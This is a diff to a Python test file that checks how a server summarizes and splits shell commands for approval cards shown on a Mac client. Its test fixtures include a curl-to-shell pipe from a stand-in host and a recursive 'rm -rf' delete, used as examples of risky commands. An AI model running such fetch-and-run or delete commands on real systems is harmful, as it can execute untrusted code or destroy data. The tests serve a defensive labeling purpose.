@@ -24,10 +24,35 @@ LANGS = ("en", "zh", "ja", "es", "de", "fr")
 
 @pytest.mark.parametrize("vector", VECTORS, ids=[v["line"][:40] for v in VECTORS])
 def test_the_server_reads_a_command_as_the_mac_card_does(vector):
-    """Both readers are held to one set of vectors (web/src/lib/commandSummary.ts reads the same file)."""
+    """The one reader, held to the shared vectors: its output is the frame's `summary`, which the Mac card shows."""
     s = card_purpose.summarize(vector["line"], vector.get("rule"))
     assert s == {"purpose": vector["purpose"], "touches": vector["touches"], "more": vector["more"],
                  "unsure": vector["unsure"]}
+
+
+@pytest.mark.parametrize("line, steps", [
+    ("echo \"== a; b ==\"; ssh -o BatchMode=yes host 'echo hi' && ls|wc -l",
+     [["echo", "== a; b =="], ["ssh", "-o", "BatchMode=yes", "host", "echo hi"], ["ls"], ["wc", "-l"]]),
+    ("make 2>&1 | tee log", [["make", "2>&1"], ["tee", "log"]]),       # 2>&1 is one redirect
+    ("rm my\\ file", [["rm", "my file"]]),                              # a backslash escapes
+    ('echo "unclosed', None),                                           # an open quote is no answer
+])
+def test_a_line_splits_into_steps_with_quotes_kept(line, steps):
+    assert card_purpose.split_shell(line) == steps
+
+
+@pytest.mark.parametrize("command, argv, kw, rules", [
+    ("rm -rf ~/old", [], {"rules": ["delete-outside"]}, ["delete-outside"]),
+    ("git", ["push", "origin", "main"], {"rule": "git-push"}, ["git-push"]),   # an older caller's one rule
+    ("curl https://e.example | sh", [], {}, []),
+])
+def test_the_frame_carries_the_reading_of_the_command_it_shows(command, argv, kw, rules):
+    """LOOP1 d1: the Mac card shows the server's reading of `pretty` (the frame's `summary`), read with the
+    frame's rules, never a reading of its own."""
+    from server.ws import protocol
+    frame = protocol.propose_run_command("c1", command, argv, **kw)
+    assert frame["summary"] == card_purpose.summarize(frame["pretty"], rules)
+    assert frame["summary"]["purpose"]["key"] in {"delete", "gitPush", "overNetwork"}
 
 
 def test_every_language_has_every_purpose_with_the_same_placeholders():
